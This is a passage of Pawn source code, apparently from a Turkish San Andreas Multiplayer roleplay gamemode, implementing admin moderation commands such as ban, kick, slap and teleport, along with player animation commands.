						format(string, sizeof(string), "(( [%d/%d/%d - %d:%d:%d] %s adlý kiþinin hesabýný kilitlendiniz. Sebep: %s ))", month,day,year, saat, dakika, saniye, giveplayer, (resultkilit));
						SendClientMessage(playerid, COLOR_RED, string);
						Kilitle(playerid,giveplayerid,resultkilit);
						return 1;
					}
				}
			}
			else
			{
				format(string, sizeof(string), "ID %d oyunda deðil.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(string, "/kilitle", true) == 0 || strcmp(string, "/ban", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/kilitle [oyuncuID] [sebep]");
				return 1;
			}
			new giveplayerid, giveplayer[MAX_PLAYER_NAME], sendername[MAX_PLAYER_NAME];
			giveplayerid = ReturnUser(string);
			if (Karakter[playerid][adminlevel] >= 2 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new lengthkilit = strlen(cmdtext);
						while ((idx < lengthkilit) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offsetkilit = idx;
						new resultkilit[128];
						while ((idx < lengthkilit) && ((idx - offsetkilit) < (sizeof(resultkilit) - 1)))
						{
							resultkilit[idx - offsetkilit] = cmdtext[idx];
							idx++;
						}
						resultkilit[idx - offsetkilit] = EOS;
						if(!strlen(resultkilit))
						{
							Kullanim(playerid, "/kilitle [oyuncuID] [sebep]");
							return 1;
						}
						if(Karakter[playerid][adminlevel] < Karakter[giveplayerid][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						new year, month,day;
						getdate(year, month, day);
						new saat, dakika, saniye;
						gettime(saat, dakika, saniye);
				        format(string, sizeof(string), "[BAN] %s tarafindan hesabi yasaklandi/kilitlendi. Sebep: %s (%d-%d-%d)",sendername,(resultkilit),month,day,year);
						Log(giveplayerid, string);
						format(string, sizeof(string), "[BANLADI] %s adli kisinin hesabini yasakladi/kilitledi. Sebep: %s (%d-%d-%d)",giveplayer,(resultkilit),month,day,year);
						Log(playerid, string);
						format(string, sizeof(string), "(( %s sunucudan yasaklandý. Sebep: %s %d/%s%d/%s%d - %s%d:%s%d ))", giveplayer, (resultkilit), day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year, (saat < 10) ? ("0") : (""), saat, (dakika < 10) ? ("0") : (""), dakika);
						SendClientMessageToAll(COLOR_RED, string);
						Kilitle(playerid,giveplayerid,resultkilit);
						return 1;
					}
				}
			}
			else
			{
				format(string, sizeof(string), "ID %d oyunda deðil.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(string, "/ck", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/ck [oyuncuID]");
				return 1;
			}
			new giveplayerid, giveplayer[MAX_PLAYER_NAME], sendername[MAX_PLAYER_NAME];
			giveplayerid = ReturnUser(string);
			if (Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(giveplayerid))
			    {
			        if(giveplayerid != INVALID_PLAYER_ID)
			        {
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						if(Karakter[playerid][adminlevel] < Karakter[giveplayerid][adminlevel])
				     	{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
				     	    return 0;
				     	}
						new year, month,day;
						getdate(year, month, day);
						new saat, dakika, saniye;
						gettime(saat, dakika, saniye);
				        format(string, sizeof(string), "[CK] %s tarafindan hesabi CK edildi. Sebep: Karakter Ölümü (%d-%d-%d)",sendername,month,day,year);
						Log(giveplayerid, string);
						format(string, sizeof(string), "[CK] %s adli kisinin hesabini yasakladi/kilitledi. Sebep: Karakter Ölümü (%d-%d-%d)",giveplayer,month,day,year);
						Log(playerid, string);
						format(string, sizeof(string), "(( %s sunucudan yasaklandý. Sebep: Karakter Ölümü %d/%s%d/%s%d - %s%d:%s%d ))", giveplayer, day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year, (saat < 10) ? ("0") : (""), saat, (dakika < 10) ? ("0") : (""), dakika);
						SendClientMessageToAll(COLOR_RED, string);
						Karakter[giveplayerid][ck] = 1;
                        KickEx(giveplayerid);
						return 1;
					}
				}
			}
			else
			{
				format(string, sizeof(string), "ID %d oyunda deðil.", giveplayerid);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(string, "/kickall", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			if(Karakter[playerid][adminlevel] >= 5 && Karakter[playerid][aGirdi] == 1)
			{
				foreach(new giveplayerid : Player)
				{
					if(giveplayerid != playerid && Karakter[giveplayerid][adminlevel] == 0)
    				{
			    		Bilgi(giveplayerid, "Sunucu bakým moduna aldýndý, detaylarý Discord veya forum üzerinden alabilirsiniz.");
						KickEx(giveplayerid);
					}
				}
				Bilgi(playerid, "Adminler dýþýndaki herkes kicklendi.");
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yetkiniz bulunmamakta.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/skick", true) == 0 || Buysa("/sessizkick",string))
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/skick [ID/isim] [sebep]");
				return 1;
			}
			new giveplayerid = ReturnUser(string);
			if(Karakter[playerid][adminlevel] >= 3 && Karakter[playerid][aGirdi] == 1)
			{
				if(IsPlayerConnected(giveplayerid))
				{
					new lengthsaq = strlen(cmdtext);
					while ((idx < lengthsaq) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offsetsaq = idx;
					new resultsaq[128];
					while ((idx < lengthsaq) && ((idx - offsetsaq) < (sizeof(resultsaq) - 1)))
					{
						resultsaq[idx - offsetsaq] = cmdtext[idx];
						idx++;
					}
					resultsaq[idx - offsetsaq] = EOS;
					if(!strlen(resultsaq))
					{
						Kullanim(playerid, "/skick [ID/isim] [sebep]");
						return 1;
					}
					if(Karakter[playerid][adminlevel] < Karakter[giveplayerid][adminlevel])
    				{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
							return 0;
				    }
					format(string, sizeof(string),"%s isimli oyuncuyu sunucudan attýnýz. Sebep: %s", OyuncuAdiniBul(giveplayerid), (resultsaq));
					SendClientMessage(playerid, COLOR_GREY, string);
					Log(giveplayerid,string);
					Log(playerid,string);
					KickEx(giveplayerid);
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yetkiniz bulunmamakta.");
			}
		}
		return 1;
	}
	if(strcmp(string, "/kick", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	    	string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/kick [ID/isim] [sebep]");
				return 1;
			}
			new giveplayerid = ReturnUser(string);
			if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
				if(IsPlayerConnected(giveplayerid))
				{
					new lengthsaq = strlen(cmdtext);
					while ((idx < lengthsaq) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offsetsaq = idx;
					new resultsaq[128];
					while ((idx < lengthsaq) && ((idx - offsetsaq) < (sizeof(resultsaq) - 1)))
					{
						resultsaq[idx - offsetsaq] = cmdtext[idx];
						idx++;
					}
					resultsaq[idx - offsetsaq] = EOS;
					if(!strlen(resultsaq))
					{
						Kullanim(playerid, "/kick [ID/isim] [sebep]");
						return 1;
					}
					if(Karakter[playerid][adminlevel] < Karakter[giveplayerid][adminlevel])
    				{
				     	    Ipucu(playerid, "Kendinizden yüksek levelli admine iþlem yapamazsýnýz.");
							return 0;
				    }
				    new year, month,day;
					getdate(year, month, day);
					new hour,minuite,second;
					gettime(hour,minuite,second);
					format(string, sizeof(string), "(( %s sunucudan atýldý. Sebep: %s %d/%s%d/%s%d - %s%d:%s%d ))", OyuncuAdiniBul(giveplayerid,1),(resultsaq), day, ((month < 10) ? ("0") : ("")), month, (year < 10) ? ("0") : (""), year, (hour < 10) ? ("0") : (""), hour, (minuite < 10) ? ("0") : (""), minuite);
					SendClientMessageToAll(COLOR_RED, string);
					Log(giveplayerid,string);
					Log(playerid,string);
					KickEx(giveplayerid);
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yetkiniz bulunmamakta.");
			}
		}
		return 1;
	}
	else if(strcmp(string, "/tokat", true) == 0 || strcmp(string, "/slap", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/tokat [oyuncuID/isim]");
				return 1;
			}
			new playa;
			new Float:shealth;
			new Float:slx, Float:rennie, Float:slz;
			playa = ReturnUser(string);
			if (Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						GetPlayerHealth(playa, shealth);
						SetPlayerHealth(playa, shealth-5);
						GetPlayerPos(playa, slx, rennie, slz);
						SetPlayerPos(playa, slx, rennie, slz+5);
						PlayerPlaySound(playa, 1130, slx, rennie, slz+5);
						printf("AdmCmd: %s, %s adlý kiþiyi tokatladý",OyuncuAdiniBul(playerid),  OyuncuAdiniBul(playa));
						format(string, sizeof(string), "AdmCmd: %s tokatlandý(%s)",OyuncuAdiniBul(playa), OyuncuAdiniBul(playerid));
						EkibeYolla(COLOR_LIGHTRED,string,1);
					}
				}
			}
			else
			{
				Hata(playerid, "Bu komutu kullanmak için yetkiniz yok!");
			}
		}
		return 1;
	}
	if(strcmp(string, "/setvw", true) == 0)
	{
	    if((Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1) || Karakter[playerid][tester] >= 2)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/setvw [ID/isim] [virtual world]");
	            return 1;
			}
			new giveplayerid = ReturnUser(string);
			string = strtok(cmdtext, idx);
			new ananinamiozaman = strval(string);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/setvw [ID/isim] [virtual world]");
			    return 1;
			}
			SetPlayerVirtualWorld(giveplayerid, ananinamiozaman);
			format(string, sizeof(string), "%s adlý oyuncunun virtual world idsini %d olarak deðiþtirdiniz.", OyuncuAdiniBul(giveplayerid), ananinamiozaman);
			Bilgi(playerid, string);
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/setint", true) == 0)
	{
	    if((Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1) || Karakter[playerid][tester] >= 2)
	    {
	        string = strtok(cmdtext, idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/setint [ID/isim] [interior]");
	            return 1;
			}
			new giveplayerid = ReturnUser(string);
			string = strtok(cmdtext, idx);
			new ananinamiozaman = strval(string);
			if(!strlen(string))
			{
			    Kullanim(playerid, "/setint [ID/isim] [interior]");
			    return 1;
			}
			SetPlayerInteriorEx(giveplayerid, ananinamiozaman);
			format(string, sizeof(string), "%s adlý oyuncunun interior idsini %d olarak deðiþtirdiniz.", OyuncuAdiniBul(giveplayerid), ananinamiozaman);
			Bilgi(playerid, string);
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/getcar", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        string = strtok(cmdtext,idx);
	        if(!strlen(string))
	        {
	            Kullanim(playerid, "/getcar [vehID]");
				return 1;
			}
			new deq = strval(string);
	        new Float:XX,Float:YY,Float:ZZ;
	        GetPlayerPos(playerid,XX,YY,ZZ);
	        SetVehiclePosEx(deq,XX,YY+3,ZZ);
			LinkVehicleToInterior(deq, GetPlayerInterior(playerid));
			SetVehicleVirtualWorld(deq, GetPlayerVirtualWorld(playerid));
			if(cezali[deq] > 0) Bilgi(playerid, "Aracýn ceza kaydý bulunmaktadýr.");
		}
		else Hata(playerid, "Bu komutu kullanabilmek için yeterli yetkiye sahip deðilsiniz.");
		return 1;
	}
	if(strcmp(string, "/lgoto", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
	    {
	        new gidicem[128];
			gidicem = strtok(cmdtext, idx);
			if(!strlen(gidicem))
			{
				return Kullanim(playerid, "/lgoto [x] [y] [z] [interior]");
			}
			new Float:X, Float:Y, Float:Z;
			new kdid;
			X = floatstr(gidicem);
			Y = floatstr(strtok(cmdtext,idx));
			Z = floatstr(strtok(cmdtext,idx));
			kdid = strval(strtok(cmdtext,idx));
			if(GetPlayerVehicleID(playerid))
			{
			    SetVehiclePosEx(GetPlayerVehicleID(playerid), X, Y, Z);
			}
			else
			{
			    SetPlayerPos(playerid, X, Y, Z);
			}
			SetPlayerInteriorEx(playerid, kdid);
			return 1;
		}
	}
	if(strcmp(string, "/gethere", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/gethere [ID/isim]");
				return 1;
			}
			new Float:plocx,Float:plocy,Float:plocz;
			new plo;
			plo = ReturnUser(string);
			if (IsPlayerConnected(plo))
			{
			    if(plo != INVALID_PLAYER_ID)
			    {
					if (Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
					{
					    if(gSpectateType[plo] != ADMIN_SPEC_TYPE_NONE) return Hata(playerid, "Bu yönetici þuan oyuncu izlemektedir.");
					    if(Karakter[playerid][tester] == 1 && Karakter[plo][adminlevel] >= 1) return Hata(playerid, "Admini çekemezsiniz.");
						GetPlayerPos(playerid, plocx, plocy, plocz);
						SetPlayerInteriorEx(plo,GetPlayerInterior(playerid));
						SetPlayerVirtualWorld(plo,GetPlayerVirtualWorld(playerid));
						if (GetPlayerState(plo) == 2)
						{
							new tmpcar = GetPlayerVehicleID(plo);
							SetVehiclePosEx(tmpcar, plocx, plocy+4, plocz);
							format(string, sizeof(string), "%s adlý oyuncuyu yanýnýza ýþýnlandýnýz.", OyuncuAdiniBul(plo));
							Bilgi(playerid, string);
						}
						else
						{
							SetPlayerPos(plo,plocx,plocy+2, plocz);
							format(string, sizeof(string), "%s adlý oyuncuyu yanýnýza ýþýnlandýnýz.", OyuncuAdiniBul(plo));
							Bilgi(playerid, string);
						}
					}
					else
					{
						Hata(playerid, "Bu komutu kullanmak için yetkin yok!");
					}
				}
			}
			else
			{
				format(string, sizeof(string), "ID %d oyunda deðil.", plo);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
	if(strcmp(string, "/goto", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			string = strtok(cmdtext,idx);
			if(!strlen(string))
			{
				Kullanim(playerid, "/goto [ID/isim]");
				return 1;
			}
			new Float:plocx,Float:plocy,Float:plocz;
			new plo;
			plo = ReturnUser(string);
			if (IsPlayerConnected(plo))
			{
			    if(plo != INVALID_PLAYER_ID)
			    {
					if (Karakter[playerid][adminlevel] >= 1 && Karakter[playerid][aGirdi] == 1)
					{
					    if(gSpectateType[plo] != ADMIN_SPEC_TYPE_NONE) return Hata(playerid, "Bu yönetici þuan oyuncu izlemektedir.");
						if(gSpectateType[playerid] != ADMIN_SPEC_TYPE_NONE){
						TogglePlayerSpectating(playerid, 0);
						gSpectateType[playerid] = ADMIN_SPEC_TYPE_NONE;
						return 1;
					}
						GetPlayerPos(plo, plocx, plocy, plocz);
						SetPlayerInteriorEx(playerid,GetPlayerInterior(plo));
						SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(plo));
						if (GetPlayerState(playerid) == 2)
						{
							new tmpcar = GetPlayerVehicleID(playerid);
							SetVehiclePosEx(tmpcar, plocx, plocy+4, plocz);
							format(string, sizeof(string), "%s adlý oyuncunun yanýna ýþýnlandýnýz.", OyuncuAdiniBul(plo));
							Bilgi(playerid, string);
						}
						else
						{
							SetPlayerPos(playerid,plocx,plocy+2, plocz);
							format(string, sizeof(string), "%s adlý oyuncunun yanýna ýþýnlandýnýz.", OyuncuAdiniBul(plo));
							Bilgi(playerid, string);
						}
					}
					else
					{
						Hata(playerid, "Bu komutu kullanmak için yetkiniz yok.");
					}
				}
			}
			else
			{
				format(string, sizeof(string), "ID %d oyunda deðil.", plo);
				SendClientMessage(playerid, COLOR_GRAD1, string);
			}
		}
		return 1;
	}
    	// animler

	if(strcmp(string, "/gsign", true) == 0)
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid,"/gsign [1-10]");
	        return 1;
	    }
	    new animationplayed = strval(string);
	    if(animationplayed < 1 || animationplayed > 10)
	    {
	        Kullanim(playerid,"/gsign [1-10]");
	        return 1;
	    }
	    if(animationplayed == 1)
	    {
	        ApplyAnimationEx(playerid,"GHANDS","gsign1",4.1,0,1,1,1,1);
	    }
	    else if(animationplayed == 2)
	    {
	        ApplyAnimationEx(playerid,"GHANDS","gsign1LH",4.1,0,1,1,1,1);
	    }
	    else if(animationplayed == 3)
	    {
	        ApplyAnimationEx(playerid,"GHANDS","gsign2",4.1,0,1,1,1,1);
	    }
		else if(animationplayed == 4) {
	        ApplyAnimationEx(playerid,"GHANDS","gsign2LH",4.1,0,1,1,1,1);
  		}
  		else if(animationplayed == 5) {
	        ApplyAnimationEx(playerid,"GHANDS","gsign3",4.1,0,1,1,1,1);
    	}
		else if(animationplayed == 6) {
	        ApplyAnimationEx(playerid,"GHANDS","gsign3LH",4.1,0,1,1,1,1);
  		}
  		else if(animationplayed == 7) {
	        ApplyAnimationEx(playerid,"GHANDS","gsign4",4.1,0,1,1,1,1);
    	}
		else if(animationplayed == 8) {
	        ApplyAnimationEx(playerid,"GHANDS","gsign4LH",4.1,0,1,1,1,1);
  		}
  		else if(animationplayed == 9) {
	        ApplyAnimationEx(playerid,"GHANDS","gsign5",4.1,0,1,1,1,1);
  		}
  		else if(animationplayed == 10) {
	        ApplyAnimationEx(playerid,"GHANDS","gsign5LH",4.1,0,1,1,1,1);
	    }
	    return 1;
	}
	if(strcmp(string, "/rap", true) == 0)
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/rap [1-3]");
	        return 1;
	    }
	    new animationplayed = strval(string);
	    if(animationplayed < 1 || animationplayed > 10)
	    {
	        Kullanim(playerid, "/rap [1-3]");
	        return 1;
	    }
	    if(animationplayed == 1)
	    {
	        ApplyAnimationEx(playerid, "RAPPING", "RAP_A_Loop", 4.0, 1, 0, 0, 0, 0);
     	}
 		else if(animationplayed == 2) {
	        ApplyAnimationEx(playerid, "RAPPING", "RAP_B_Loop", 4.0, 1, 0, 0, 0, 0);
   		}
   		else if(animationplayed == 3) {
			ApplyAnimationEx(playerid, "RAPPING", "RAP_C_Loop", 4.0, 1, 0, 0, 0, 0);
	    }
	    return 1;
	}
	if(strcmp(string, "/saygi", true) == 0)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        ApplyAnimationEx(playerid,"DEALER","DEALER_IDLE",4.0,1,0,0,0,0);
	        return 1;
	    }
	}
	if(strcmp(string, "/yuru", true) == 0 || strcmp(string, "/walk", true) == 0)
	{
	    string = strtok(cmdtext,idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/yuru [1-11]");
	        return 1;
	    }
	    new esya = strval(string);
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        if(esya == 1)
	        {
	            ApplyAnimation(playerid,"PED","WALK_player",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
         	}
			else if(esya == 2) {
	            ApplyAnimation(playerid,"PED","WALK_fat",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
   			}
   			else if(esya == 3) {
	            ApplyAnimation(playerid,"PED","WOMAN_walksexy",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
				return 1;
      		}
		  	else if(esya == 4) {
	            ApplyAnimation(playerid,"PED","WOMAN_walkpro",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
        	}
			else if(esya == 5) {
	            ApplyAnimation(playerid,"PED","WOMAN_walkbusy",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
			}
			else if(esya == 6) {
	            ApplyAnimation(playerid,"PED","WOMAN_walknorm",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
   			}
   			else if(esya == 7) {
	            ApplyAnimation(playerid,"PED","WALK_fatold",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
      		}
	  		else if(esya == 8){
	            ApplyAnimation(playerid,"PED","WALK_old",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
     		}
		 	else if(esya == 9){
	            ApplyAnimation(playerid,"PED","WALK_civi",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
    		}
			else if(esya == 10){
	            ApplyAnimation(playerid,"PED","WALK_gang1",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
   			}
   			else if(esya == 11){
	            ApplyAnimation(playerid,"PED","WALK_gang2",4.1,1,1,1,1,1,1);
	            AnimasyonYapiyor[playerid] = true;
	            return 1;
	        }
	    }
	}
	if(strcmp(string, "/konus", true) == 0 || strcmp(string, "/chat", true) == 0)
	{
	    string = strtok(cmdtext,idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/konus [1-6]");
	        return 1;
	    }
	    new esya = strval(string);
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        if(esya == 1)
	        {
	            ApplyAnimationEx(playerid,"PED","IDLE_CHAT",4.1,1,1,1,1,1);
	            return 1;
         	}
 			else if(esya == 2){
	            ApplyAnimationEx(playerid,"PED","IDLE_chat",4.1,1,1,1,1,1);
	            return 1;
    		}
			else if(esya == 3){
	            ApplyAnimationEx(playerid,"benchpress","gym_bp_celebrate",4.1,0,1,1,1,1);
	            return 1;
   			}
   			else if(esya == 4){
	            ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkA",4.1,0,1,1,1,1);
	            return 1;
      		}
	  		else if(esya == 5){
	            ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkB",4.1,0,1,1,1,1);
	            return 1;
     		}
		 	else if(esya == 6){
	            ApplyAnimationEx(playerid,"GANGS","prtial_gngtlkD",4.1,0,1,1,1,1);
	            return 1;
	        }
	    }
	}
	if(strcmp(string, "/riot", true) == 0 || strcmp(string, "/isyan", true) == 0)
	{
	    string = strtok(cmdtext,idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/isyan [1-6]");
	        return 1;
	    }
	    new esya = strval(string);
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        if(esya == 1)
	        {
	            ApplyAnimationEx(playerid,"RIOT","RIOT_ANGRY",4.1,0,0,0,1,1);
	            return 1;
         	}
 			else if(esya == 2){
	            ApplyAnimationEx(playerid,"RIOT","RIOT_challenge",4.1,0,0,0,1,1);
	            return 1;
   			}
   			else if(esya == 3){
	            ApplyAnimationEx(playerid,"RIOT","RIOT_CHANT",4.1,1,0,0,1,1);
	            return 1;
      		}
		  	else if(esya == 4){
	            ApplyAnimationEx(playerid,"RIOT","RIOT_FUKU",2.1,0,0,0,1,1);
	            return 1;
     		}
 			else if(esya == 5){
	            ApplyAnimationEx(playerid,"RIOT","RIOT_PUNCHES",4.1,0,0,0,1,1);
	            return 1;
    		}
			else if(esya == 6){
	            ApplyAnimationEx(playerid,"RIOT","RIOT_shout",4.1,0,0,0,1,1);
	            return 1;
	        }
	    }
	}
	if(strcmp(string, "/chant", true) == 0)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        ApplyAnimationEx(playerid,"RIOT","RIOT_CHANT",4.1,1,0,0,1,1);
	        return 1;
	    }
	    return 1;
	}
	if(strcmp(string, "/smoke", true) == 0 || strcmp(string, "/smokem", true) == 0 || strcmp(string, "/smokef", true) == 0)
	{
	    string = strtok(cmdtext,idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/smoke [1-2]");
	        return 1;
	    }
	    new esya = strval(string);
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        if(esya == 1)
	        {
	            ApplyAnimationEx(playerid,"SMOKING", "M_smklean_loop",4.1,1,0,0,1,1);
	            return 1;
         	}
 			else if(esya == 2){
	            ApplyAnimationEx(playerid,"SMOKING", "F_smklean_loop",4.1,1,0,0,1,1);
	            return 1;
	        }
	    }
	}
	if(strcmp(string, "/wave", true) == 0)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        ApplyAnimationEx(playerid,"ON_LOOKERS", "wave_loop",4.1,1,0,0,1,1);
	        return 1;
	    }
	    return 1;
	}
	if(strcmp(string, "/sarhos", true) == 0 || strcmp(string, "/drunk", true) == 0)
	{
	    string = strtok(cmdtext,idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/sarhos [1-2]");
	        return 1;
	    }
	    new esya = strval(string);
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        if(esya == 1)
	        {
	            ApplyAnimationEx(playerid,"PED","WALK_DRUNK",4.1,1,1,1,1,1);
	            return 1;
         	}
 			else if(esya == 2){
	            ApplyAnimationEx(playerid,"RYDER","RYD_Die_PT1",4.1,1,1,1,1,1);
	            return 1;
	        }
	    }
	}

	if(strcmp(string, "/otur", true) == 0)
	{
	    string = strtok(cmdtext,idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/otur [1-3]");
	        return 1;
	    }
	    new esya = strval(string);
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        if(esya == 1)
	        {
	            ApplyAnimationEx(playerid,"PED","SEAT_down",4.0, 0,0,0,1,1);
	            gOtur[playerid] = true;
	            return 1;
	        }
	        else if(esya == 2)
	        {
	            ApplyAnimationEx(playerid,"JST_BUISNESS","girl_02",4.1,0,1,1,1,1);
	            gOtur[playerid] = true;
	            return 1;
	        }
	        else if(esya == 3)
	        {
	            ApplyAnimationEx(playerid,"BEACH", "ParkSit_M_loop", 4.1, 0,1,1,1,1);
	            gOtur[playerid] = true;
	            return 1;
	        }
	    }
	}
	if(strcmp(string, "/nisan", true) == 0)
	{
	    string = strtok(cmdtext,idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/nisan [1-4]");
	        return 1;
	    }
	    new esya = strval(string);
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        if(esya == 1)
	        {
	            ApplyAnimationEx(playerid,"PED","ARRESTgun",4.1,0,1,1,1,1);
	            return 1;
	        }
	        else if(esya == 2)
	        {
	            ApplyAnimationEx(playerid,"PED","gang_gunstand",4.1,0,1,1,1,1);
	            return 1;
	        }
	        else if(esya == 3)
	        {
	            ApplyAnimationEx(playerid,"POLICE","COP_getoutcar_LHS",4.1,0,1,1,1,1);
	            return 1;
	        }
	        else if(esya == 4)
	        {
	            ApplyAnimationEx(playerid,"BUDDY","buddy_crouchreload", 4.1, 0, 1, 1, 1, 1);
	            return 1;
	        }
	        else if(esya == 5)
	        {
	            ApplyAnimationEx(playerid,"SWORD","sword_block", 4.1, 0, 1, 1, 1, 1);
	            return 1;
	        }
	    }
	}
	if(strcmp(string, "/buddy", true) == 0)
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/buddy [1-2]");
	        return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
		    if(esya == 1)
		    {
		        ApplyAnimationEx(playerid,"BUDDY","buddy_reload", 4.1, 0, 1, 1, 1, 1);
		        return 1;
			}
		    if(esya == 2)
		    {
		        ApplyAnimationEx(playerid,"COLT45","colt45_reload", 4.1, 0, 1, 1, 1, 1);
		        return 1;
			}
		}
	}
	if(strcmp(string, "/carry", true) == 0)
	{
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/carry [1-1]");
	        return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
		    if(esya == 1)
		    {
		        ApplyAnimationEx(playerid,"CARRY","crry_prtial",4.1, 1, 1, 1, 1, 1);
		        return 1;
			}
		}
	}
	if(strcmp(string, "/swat", true) == 0)
	{
        string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
	        Kullanim(playerid, "/swat [1-1]");
	        return 1;
		}
		new esya = strval(string);
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
		{
		    if(esya == 1)
		    {
